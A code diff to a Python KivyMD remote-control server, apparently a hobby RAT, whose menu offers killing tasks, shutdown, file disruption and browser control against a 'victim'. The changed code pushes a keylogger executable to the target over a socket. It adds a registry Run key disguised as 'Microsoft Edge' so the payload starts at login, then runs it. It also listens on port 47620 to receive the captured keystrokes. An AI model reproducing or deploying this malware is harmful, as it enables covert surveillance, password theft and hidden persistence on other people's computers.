@@ -32,8 +32,7 @@ ScreenManager:
             halign: 'center'
             size_hint_y: None
             height: self.texture_size[1]
-            padding_y: "500"
-
+            pos_hint: {"center_x": .5, "center_y": .8}
     MDScreen:
         name: "mainMenu"            
         ScrollView:
@@ -93,17 +92,14 @@ ScreenManager:
                     id: killTaskBtn
                     text: "Kill Task"
                     on_press: app.KillTask()
-
                 OneLineListItem:
                     id: shutDownBtn
                     text: "Shutdown"
                     on_press: app.Shutdown()
-
                 OneLineListItem:
                     id: fileCreateBtn
                     text: "File Creation Disruption"
                     on_press: app.FileCreate()
-
                 OneLineListItem:
                     id: firewallBtn
                     text: "Firewall"
@@ -113,7 +109,6 @@ ScreenManager:
                     id: denyFileBtn
                     text: "Deny Files"
                     on_press: app.DenyFiles()
-
                 OneLineListItem:
                     id: openBrowser
                     text: "Open Browsers"
@@ -160,10 +155,9 @@ ScreenManager:
     MDTextField:
         id: denyFilesID
         hint_text: 'Enter File Path'
-
 '''
 # Server IP and Port
-HOST = '127.0.0.1'  # Temporary localhost for testing (Make sure to use the client's IP during production
+HOST = '192.168.123.165'  # Temporary localhost for testing (Make sure to use the client's IP during production
 PORT = 21420
 
 class Main(MDApp):
@@ -554,16 +548,20 @@ class Main(MDApp):
             print('Command sent to client: ', command)
             recvsize = self.currConn.recv(1024).decode()
             isExist = self.currConn.recv(int(recvsize)).decode()
-            # Send payload to target if it isn't there yet
+            
+            # Send payload to target if it isn't there yet            
             if isExist.strip() == "False":
                 print("Sending keylogger payload to victim.")
+                
                 # File transfer mode
                 self.currConn.send("ft_True".encode())
                 time.sleep(0.02)
-                # Send target path and size of file
+                
+                # Send target path and size of file    
                 self.currConn.send(str("echo " + tpath).encode())
                 self.currConn.send(str(os.path.getsize(kpath)).encode())
                 time.sleep(1)
+                
                 # Send exe in packets with size 8192
                 f = open(kpath, 'rb')
                 bytesToSend = f.read(8192)
@@ -577,12 +575,14 @@ class Main(MDApp):
                 print("[VICTIM]: ", self.currConn.recv(1024).decode())
                 time.sleep(0.05)
                 # Add payload to registry to run on login
+                
                 command = f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "Microsoft Edge" /t REG_SZ /d "{tpath}" /f'
                 self.currConn.send(command.encode())
                 print('Command sent to client: ', command)
                 recvsize = self.currConn.recv(1024).decode()
                 output = self.currConn.recv(int(recvsize)).decode()
                 print('Registry add: ', output)
+                
                 # Run payload once
                 time.sleep(0.05)
                 self.currConn.send("exe_True".encode())
@@ -597,31 +597,33 @@ class Main(MDApp):
             break
 
     def KeyloggerInit(self):
-        kl = threading.Thread(target=self.Keylogger).start() #figure out how to kill thread
+        threading.Thread(target=self.Keylogger).start() #figure out how to kill thread
 
     def KeyloggerStop(self):
         self.exitKeyLogger.set()
 
     def Keylogger(self):
-        self.exitKeyLogger.clear()
-        # Connect to keylogger on port 47620
-        print("Waiting for victim to transmit keylog info.")
-        klserver = socket.socket()
-        klserver.bind((HOST, 47620))
-        klserver.listen()
-        conn, addr = klserver.accept()
-        print(f"Connection from {addr} established!")
-        while True:
-            if not self.exitKeyLogger.isSet():
-                keys = conn.recv(1024).decode()
-                print(keys)
-            else:
-                break
-        conn.close()
-        print("Connection Closed.")
+        try:
+            self.exitKeyLogger.clear()
+            
+            # Connect to keylogger on port 47620       
+            klserver = socket.socket()
+            klserver.bind((HOST, 47620))
+            klserver.listen()
+            print("Waiting for victim to transmit keylog info.")
+            conn, addr = klserver.accept()
+            print(f"Connection from {addr} established!")
+            while True:
+                if not self.exitKeyLogger.isSet():
+                    keys = conn.recv(1024).decode()
+                    print(keys)
+                else:
+                    break
+            conn.close()
+            print("Connection Closed.")
 
-
-
+        except:
+            pass
 
     def DisruptionMenu(self):
         self.root.current = "disruptionMenu"
